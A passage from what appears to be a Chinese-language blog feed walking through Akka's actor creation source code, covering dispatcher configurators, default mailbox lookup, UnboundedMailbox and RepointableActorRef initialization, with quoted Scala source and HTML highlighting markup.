class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">abstract</span> class <span class="title">MessageDispatcherConfigurator</span><span class="params">(_config: Config, val prerequisites: DispatcherPrerequisites)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  val config: Config = <span class="keyword">new</span> CachingConfig(_config)</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns an instance of MessageDispatcher given the configuration.</span></span><br><span class="line"><span class="comment">   * Depending on the needs the implementation may return a new instance for</span></span><br><span class="line"><span class="comment">   * each invocation or return the same instance every time.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">def <span class="title">dispatcher</span><span class="params">()</span>: MessageDispatcher</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">  def <span class="title">configureExecutor</span><span class="params">()</span>: ExecutorServiceConfigurator </span>= &#123;</span><br><span class="line">    <span class="function">def <span class="title">configurator</span><span class="params">(executor: String)</span>: ExecutorServiceConfigurator </span>= executor match &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="keyword">null</span> | <span class="string">&quot;&quot;</span> | <span class="string">&quot;fork-join-executor&quot;</span> ⇒ <span class="keyword">new</span> ForkJoinExecutorConfigurator(config.getConfig(<span class="string">&quot;fork-join-executor&quot;</span>), prerequisites)</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;thread-pool-executor&quot;</span>           ⇒ <span class="keyword">new</span> ThreadPoolExecutorConfigurator(config.getConfig(<span class="string">&quot;thread-pool-executor&quot;</span>), prerequisites)</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;affinity-pool-executor&quot;</span>         ⇒ <span class="keyword">new</span> AffinityPoolConfigurator(config.getConfig(<span class="string">&quot;affinity-pool-executor&quot;</span>), prerequisites)</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">case</span> fqcn ⇒</span><br><span class="line">        val args = List(</span><br><span class="line">          classOf[Config] → config,</span><br><span class="line">          classOf[DispatcherPrerequisites] → prerequisites)</span><br><span class="line">        prerequisites.dynamicAccess.createInstanceFor[ExecutorServiceConfigurator](fqcn, args).recover(&#123;</span><br><span class="line">          <span class="keyword">case</span> exception ⇒ <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">            (<span class="string">&quot;&quot;</span><span class="string">&quot;Cannot instantiate ExecutorServiceConfigurator (&quot;</span>executor = [%s]<span class="string">&quot;), defined in [%s],</span></span><br><span class="line"><span class="string">                make sure it has an accessible constructor with a [%s,%s] signature&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line">              .format(fqcn, config.getString(<span class="string">&quot;id&quot;</span>), classOf[Config], classOf[DispatcherPrerequisites]), exception)</span><br><span class="line">        &#125;).get</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    config.getString(<span class="string">&quot;executor&quot;</span>) match &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;default-executor&quot;</span> ⇒ <span class="keyword">new</span> DefaultExecutorServiceConfigurator(config.getConfig(<span class="string">&quot;default-executor&quot;</span>), prerequisites, configurator(config.getString(<span class="string">&quot;default-executor.fallback&quot;</span>)))</span><br><span class="line">      <span class="keyword">case</span> other              ⇒ configurator(other)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> MessageDispatcherConfigurator代码不是太长，简单浏览一下代码就会发现，fork-join-executor对应了ForkJoinExecutorConfigurator。这个类是一个抽象类，里面有一个dispatcher函数返回MessageDispatcher，那么究竟是哪个子类实现了这个方法呢？我们再来看一下lookupConfigurator的具体代码，就会发现其中有一段configuratorFrom(config(id))代码非常可疑，它创建了MessageDispatcherConfigurator类的一个实例。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">lookupConfigurator</span><span class="params">(id: String)</span>: MessageDispatcherConfigurator </span>= &#123;</span><br><span class="line">  dispatcherConfigurators.get(id) match &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">null</span> ⇒</span><br><span class="line">      <span class="comment">// It doesn&#x27;t matter if we create a dispatcher configurator that isn&#x27;t used due to concurrent lookup.</span></span><br><span class="line">      <span class="comment">// That shouldn&#x27;t happen often and in case it does the actual ExecutorService isn&#x27;t</span></span><br><span class="line">      <span class="comment">// created until used, i.e. cheap.</span></span><br><span class="line">      val newConfigurator =</span><br><span class="line">        <span class="keyword">if</span> (cachingConfig.hasPath(id)) configuratorFrom(config(id))</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(s<span class="string">&quot;Dispatcher [$id] not configured&quot;</span>)</span><br><span class="line"> </span><br><span class="line">      dispatcherConfigurators.putIfAbsent(id, newConfigurator) match &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">null</span>     ⇒ newConfigurator</span><br><span class="line">        <span class="keyword">case</span> existing ⇒ existing</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> existing ⇒ existing</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">configuratorFrom</span><span class="params">(cfg: Config)</span>: MessageDispatcherConfigurator </span>= &#123;</span><br><span class="line">  <span class="keyword">if</span> (!cfg.hasPath(<span class="string">&quot;id&quot;</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(<span class="string">&quot;Missing dispatcher &#x27;id&#x27; property in config: &quot;</span> + cfg.root.render)</span><br><span class="line"> </span><br><span class="line">  cfg.getString(<span class="string">&quot;type&quot;</span>) match &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;Dispatcher&quot;</span> ⇒ <span class="keyword">new</span> DispatcherConfigurator(cfg, prerequisites)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;BalancingDispatcher&quot;</span> ⇒</span><br><span class="line">      <span class="comment">// FIXME remove this case in 2.4</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;BalancingDispatcher is deprecated, use a BalancingPool instead. &quot;</span> +</span><br><span class="line">        <span class="string">&quot;During a migration period you can still use BalancingDispatcher by specifying the full class name: &quot;</span> +</span><br><span class="line">        classOf[BalancingDispatcherConfigurator].getName)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;PinnedDispatcher&quot;</span> ⇒ <span class="keyword">new</span> PinnedDispatcherConfigurator(cfg, prerequisites)</span><br><span class="line">    <span class="keyword">case</span> fqn ⇒</span><br><span class="line">      val args = List(classOf[Config] → cfg, classOf[DispatcherPrerequisites] → prerequisites)</span><br><span class="line">      prerequisites.dynamicAccess.createInstanceFor[MessageDispatcherConfigurator](fqn, args).recover(&#123;</span><br><span class="line">        <span class="keyword">case</span> exception ⇒</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(</span><br><span class="line">            (<span class="string">&quot;Cannot instantiate MessageDispatcherConfigurator type [%s], defined in [%s], &quot;</span> +</span><br><span class="line">              <span class="string">&quot;make sure it has constructor with [com.typesafe.config.Config] and &quot;</span> +</span><br><span class="line">              <span class="string">&quot;[akka.dispatch.DispatcherPrerequisites] parameters&quot;</span>)</span><br><span class="line">              .format(fqn, cfg.getString(<span class="string">&quot;id&quot;</span>)), exception)</span><br><span class="line">      &#125;).get</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> 而进入到configuratorFrom函数就会发现，它根据配置的type字段分别创建不同的MessageDispatcherConfigurator，而前面的配置文件中type是Dispatcher。那就对应了DispatcherConfigurator，这又是一个什么类呢？它是一个MessageDispatcherConfigurator子类，并且实现了dispatcher函数。这个函数创建了最终的MessageDispatcher。这个类又调用了configureExecutor()方法传入了一个ExecutorServiceConfigurator实例，根据前面的代码我们知道这就是ForkJoinExecutorConfigurator。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Configurator for creating [[akka.dispatch.Dispatcher]].</span></span><br><span class="line"><span class="comment"> * Returns the same dispatcher instance for each invocation</span></span><br><span class="line"><span class="comment"> * of the `dispatcher()` method.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DispatcherConfigurator</span>(<span class="title">config</span>: <span class="title">Config</span>, <span class="title">prerequisites</span>: <span class="title">DispatcherPrerequisites</span>)</span></span><br><span class="line"><span class="class">  <span class="keyword">extends</span> <span class="title">MessageDispatcherConfigurator</span>(<span class="title">config</span>, <span class="title">prerequisites</span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">private</span> val instance = <span class="keyword">new</span> Dispatcher(</span><br><span class="line">    <span class="keyword">this</span>,</span><br><span class="line">    config.getString(<span class="string">&quot;id&quot;</span>),</span><br><span class="line">    config.getInt(<span class="string">&quot;throughput&quot;</span>),</span><br><span class="line">    config.getNanosDuration(<span class="string">&quot;throughput-deadline-time&quot;</span>),</span><br><span class="line">    configureExecutor(),</span><br><span class="line">    config.getMillisDuration(<span class="string">&quot;shutdown-timeout&quot;</span>))</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns the same dispatcher instance for each invocation</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function">override def <span class="title">dispatcher</span><span class="params">()</span>: MessageDispatcher </span>= instance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>自此一个MessageDispatcher创建完成。这创建过程真是曲折蜿蜒啊，哈哈哈。不过有些是为了抽象、封装，有些是为了可配置，稍微复杂了点。下面就分析defaultMailbox如何创建的。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> lazy val defaultMailbox = system.mailboxes.lookup(Mailboxes.DefaultMailboxId)</span><br></pre></td></tr></table></figure><pre><code> 跟dispatcher有点类似，也是同样的lookup创建的，当然这也是为了可配置（DefaultMailboxId = &quot;akka.actor.default-mailbox&quot;）。跟踪lookup来到以下代码。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">lookupConfigurator</span><span class="params">(id: String)</span>: MailboxType </span>= &#123;</span><br><span class="line">   mailboxTypeConfigurators.get(id) match &#123;</span><br><span class="line">     <span class="keyword">case</span> <span class="keyword">null</span> ⇒</span><br><span class="line">       <span class="comment">// It doesn&#x27;t matter if we create a mailbox type configurator that isn&#x27;t used due to concurrent lookup.</span></span><br><span class="line">       val newConfigurator = id match &#123;</span><br><span class="line">         <span class="comment">// TODO RK remove these two for Akka 2.3</span></span><br><span class="line">         <span class="keyword">case</span> <span class="string">&quot;unbounded&quot;</span> ⇒ UnboundedMailbox()</span><br><span class="line">         <span class="keyword">case</span> <span class="string">&quot;bounded&quot;</span>   ⇒ <span class="keyword">new</span> BoundedMailbox(settings, config(id))</span><br><span class="line">         <span class="keyword">case</span> _ ⇒</span><br><span class="line">           <span class="keyword">if</span> (!settings.config.hasPath(id)) <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(s<span class="string">&quot;Mailbox Type [$&#123;id&#125;] not configured&quot;</span>)</span><br><span class="line">           val conf = config(id)</span><br><span class="line"> </span><br><span class="line">           val mailboxType = conf.getString(<span class="string">&quot;mailbox-type&quot;</span>) match &#123;</span><br><span class="line">             <span class="keyword">case</span> <span class="string">&quot;&quot;</span> ⇒ <span class="keyword">throw</span> <span class="keyword">new</span> ConfigurationException(s<span class="string">&quot;The setting mailbox-type, defined in [$id] is empty&quot;</span>)</span><br><span class="line">             <span class="keyword">case</span> fqcn ⇒</span><br><span class="line">               val args = List(classOf[ActorSystem.Settings] → settings, classOf[Config] → conf)</span><br><span class="line">               dynamicAccess.createInstanceFor[MailboxType](fqcn, args).recover(&#123;</span><br><span class="line">                 <span class="keyword">case</span> exception ⇒</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(</span><br><span class="line">                     s<span class="string">&quot;Cannot instantiate MailboxType [$fqcn], defined in [$id], make sure it has a public&quot;</span> +</span><br><span class="line">                       <span class="string">&quot; constructor with [akka.actor.ActorSystem.Settings, com.typesafe.config.Config] parameters&quot;</span>,</span><br><span class="line">                     exception)</span><br><span class="line">               &#125;).get</span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">if</span> (!mailboxNonZeroPushTimeoutWarningIssued) &#123;</span><br><span class="line">             mailboxType match &#123;</span><br><span class="line">               <span class="keyword">case</span> m: ProducesPushTimeoutSemanticsMailbox <span class="keyword">if</span> m.pushTimeOut.toNanos &gt; <span class="number">0L</span> ⇒</span><br><span class="line">                 warn(s<span class="string">&quot;Configured potentially-blocking mailbox [$id] configured with non-zero pushTimeOut ($&#123;m.pushTimeOut&#125;), &quot;</span> +</span><br><span class="line">                   s<span class="string">&quot;which can lead to blocking behavior when sending messages to this mailbox. &quot;</span> +</span><br><span class="line">                   s<span class="string">&quot;Avoid this by setting `$id.mailbox-push-timeout-time` to `0`.&quot;</span>)</span><br><span class="line">                 mailboxNonZeroPushTimeoutWarningIssued = <span class="keyword">true</span></span><br><span class="line">               <span class="keyword">case</span> _ ⇒ <span class="comment">// good; nothing to see here, move along, sir.</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">           mailboxType</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">       mailboxTypeConfigurators.putIfAbsent(id, newConfigurator) match &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="keyword">null</span>     ⇒ newConfigurator</span><br><span class="line">         <span class="keyword">case</span> existing ⇒ existing</span><br><span class="line">       &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">case</span> existing ⇒ existing</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><pre><code>跟dispatcher创建有点类似，就是先查找有没有，没有就创建一个，只不过不同的是，这段代码只是创建了MailboxType，而没有直接创建真正的消息队列，不过后面再具体分析。那akka.actor.default-mailbox究竟是什么呢？同样需要翻reference.conf配置</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>-mailbox &#123;</span><br><span class="line">      # FQCN of the MailboxType. The Class of the FQCN must have a <span class="keyword">public</span></span><br><span class="line">      # constructor with</span><br><span class="line">      # (akka.actor.ActorSystem.Settings, com.typesafe.config.Config) parameters.</span><br><span class="line">      mailbox-type = <span class="string">&quot;akka.dispatch.UnboundedMailbox&quot;</span></span><br><span class="line"> </span><br><span class="line">      # If the mailbox is bounded then it uses <span class="keyword">this</span> setting to determine its</span><br><span class="line">      # capacity. The provided value must be positive.</span><br><span class="line">      # NOTICE:</span><br><span class="line">      # Up to version <span class="number">2.1</span> the mailbox type was determined based on <span class="keyword">this</span> setting;</span><br><span class="line">      # <span class="keyword">this</span> is no longer the <span class="keyword">case</span>, the type must explicitly be a bounded mailbox.</span><br><span class="line">      mailbox-capacity = <span class="number">1000</span></span><br><span class="line"> </span><br><span class="line">      # If the mailbox is bounded then <span class="keyword">this</span> is the timeout <span class="keyword">for</span> enqueueing</span><br><span class="line">      # in <span class="keyword">case</span> the mailbox is full. Negative values signify infinite</span><br><span class="line">      # timeout, which should be avoided as it bears the risk of dead-lock.</span><br><span class="line">      mailbox-push-timeout-time = 10s</span><br><span class="line"> </span><br><span class="line">      # For Actor with Stash: The <span class="keyword">default</span> capacity of the stash.</span><br><span class="line">      # <span class="function">If <span class="title">negative</span> <span class="params">(or zero)</span> then an unbounded stash is <span class="title">used</span> <span class="params">(<span class="keyword">default</span>)</span></span></span><br><span class="line"><span class="function">      # If positive then a bounded stash is used and the capacity is set using</span></span><br><span class="line"><span class="function">      # the property</span></span><br><span class="line"><span class="function">      stash-capacity </span>= -<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> 在lookupConfigurator函数中有一段很重要的代码：dynamicAccess.createInstanceFor[MailboxType](fqcn, args)。它同样调用了dynamicAccess创建了一个MailboxType的实例，实例的类型就是mailbox-type的值。那么akka.dispatch.UnboundedMailbox究竟又是怎么样的呢？</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MailboxType is a factory to create MessageQueues for an optionally</span></span><br><span class="line"><span class="comment"> * provided ActorContext.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;b&gt;Possibly Important Notice&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When implementing a custom mailbox type, be aware that there is special</span></span><br><span class="line"><span class="comment"> * semantics attached to `system.actorOf()` in that sending to the returned</span></span><br><span class="line"><span class="comment"> * ActorRef may—for a short period of time—enqueue the messages first in a</span></span><br><span class="line"><span class="comment"> * dummy queue. Top-level actors are created in two steps, and only after the</span></span><br><span class="line"><span class="comment"> * guardian actor has performed that second step will all previously sent</span></span><br><span class="line"><span class="comment"> * messages be transferred from the dummy queue into the real mailbox.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">trait MailboxType &#123;</span><br><span class="line">  <span class="function">def <span class="title">create</span><span class="params">(owner: Option[ActorRef], system: Option[ActorSystem])</span>: MessageQueue</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">trait ProducesMessageQueue[T &lt;: MessageQueue]</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="function"> * UnboundedMailbox is the default unbounded MailboxType used by Akka Actors.</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">case</span> class <span class="title">UnboundedMailbox</span><span class="params">()</span> extends MailboxType with ProducesMessageQueue[UnboundedMailbox.MessageQueue] </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="function">def <span class="title">this</span><span class="params">(settings: ActorSystem.Settings, config: Config)</span> </span>= <span class="keyword">this</span>()</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">final</span> override def <span class="title">create</span><span class="params">(owner: Option[ActorRef], system: Option[ActorSystem])</span>: MessageQueue </span>=</span><br><span class="line">    <span class="keyword">new</span> UnboundedMailbox.MessageQueue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>源码中对MailboxType的描述也非常清楚。这是一个工厂类，是用来创建MessageQueues的，只不过这个名字非常奇怪，为啥不叫MailboxFactory呢，或者MessageQueueFactory？鬼知道啊。</code></pre><p>   MailboxType的创建过程也比较清楚了，具体UnboundedMailbox.MessageQueue的类是怎么样的，继承结构又是怎么样的，我们就不再继续深入分析了。<br>   下面我们来看guardian调用的第一个方法underlying，这个词的意思是表面下的，下层的，它是一个ActorCell类型。看看它继承的类，貌似还挺复杂的。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632368418878-57db4564-8b25-4ae1-8f17-c88d7f03501e.png#clientId=uf121db86-9ab9-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u2349673f&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1670&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0b863b7b-2deb-4be7-b46e-cc229c7ec4c&title="><br>    最终调用了ActorCell的attachChild方法，而这个方法调用了makeChild，最重要的代码如下面红色框表示，调用了ActorCell.provider的actorOf，通过initChild加入了当前的children，调用actor的start方法，actor创建结束。children具体的数据结构我们暂时也不再深入研究。<br>​<img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632368418908-84ef30f9-d20a-498d-a80a-b7ed3effcd07.png#clientId=uf121db86-9ab9-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=uddb7372a&margin=%5Bobject%20Object%5D&originHeight=739&originWidth=1051&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u8be0db94-7783-4575-b4ed-3e09e3855bf&title="><br>   不过，通过ActorCell的构造函数以及继承关系我们知道上面代码中的provider就是ActorSystemImpl中的provider，也就是默认的LocalActorRefProvider，那我们还得回溯代码去看具体的actorOf函数。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632368419031-8ab797b9-ef2c-4f45-bb1e-2e8942a85302.png#clientId=uf121db86-9ab9-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u9c3fb891&margin=%5Bobject%20Object%5D&originHeight=748&originWidth=1119&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u92b87966-8b63-44dd-a414-fac6296f2a7&title="><br>   由于代码很长，可以将无关的代码折叠起来。如上图，会先判断当前有没有router，很显然没有；又用deployer中的配置，判断有没有对当前的dispatcher和mailboxType进行覆盖，很显然也没有，一切保持原样。最后一个if语句，如果async为true则创建RepointableActorRef，根据上面的代码分析，async是true。RepointableActorRef创建完成之后，调用了initialize完成初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Initialize: make a dummy cell which holds just a mailbox, then tell our</span></span><br><span class="line"><span class="comment"> * supervisor that we exist so that he can create the real Cell in</span></span><br><span class="line"><span class="comment"> * handleSupervise().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call twice on your own peril!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is protected so that others can have different initialization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">def <span class="title">initialize</span><span class="params">(async: Boolean)</span>: <span class="keyword">this</span>.type </span>=</span><br><span class="line">  underlying match &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">null</span> ⇒</span><br><span class="line">      swapCell(<span class="keyword">new</span> UnstartedCell(system, <span class="keyword">this</span>, props, supervisor))</span><br><span class="line">      swapLookup(underlying)</span><br><span class="line">      supervisor.sendSystemMessage(Supervise(<span class="keyword">this</span>, async))</span><br><span class="line">      <span class="keyword">if</span> (!async) point(<span class="keyword">false</span>)</span><br><span class="line">      <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">case</span> other ⇒ <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;initialize called more than once!&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This method is supposed to be called by the supervisor in handleSupervise()</span></span><br><span class="line"><span class="comment"> * to replace the UnstartedCell with the real one. It assumes no concurrent</span></span><br><span class="line"><span class="comment"> * modification of the `underlying` field, though it is safe to send messages</span></span><br><span class="line"><span class="comment"> * at any time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">def <span class="title">point</span><span class="params">(catchFailures: Boolean)</span>: <span class="keyword">this</span>.type</span></span><br></pre></td></tr></table></figure><p>在initialize中，给supervisor给监督者发发送了一个Supervise消息，以便监督自己；然后调用了point，具体含义可参考官方源码的注释。其实RepointableActorRef还是比较麻烦的，读者有兴趣可以自己研究，不过我个人感觉它应该主要是为了防止在actor重新创建或新建的过程中消息不会丢失设计的。具体我也没有太明白，后面再深入研究了。<br>到这里system.actorOf基本就算执行结束，它返回了一个InternalActorRef，这是ActorRef的一个子类。这样，后续的代码就可以使用 ！ 或tell给actor发送消息了。不过我们虽然大致研究了actor的创建过程，但并没有进入深入的研究，比如，我们自身的actor的实现类是在什么时候初始化的并不知道。当然这并不妨碍我们继续研究akka的源码。<br>​</p><h2 id="2-参考"><a href="#2-参考" class="headerlink" title="2.参考"></a>2.参考</h2><p><a href="https://www.cnblogs.com/gabry/p/9339785.html">https://www.cnblogs.com/gabry/p/9339785.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Actor创建&quot;&gt;&lt;a href=&quot;#1-Actor创建&quot; class=&quot;headerlink&quot; title=&quot;1.Actor创建&quot;&gt;&lt;/a&gt;1.Actor创建&lt;/h2&gt;&lt;h3 id=&quot;1-1-创建过程&quot;&gt;&lt;a href=&quot;#1-1-创建过程&quot; class=&quot;</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Actor-ActorSystem</title>
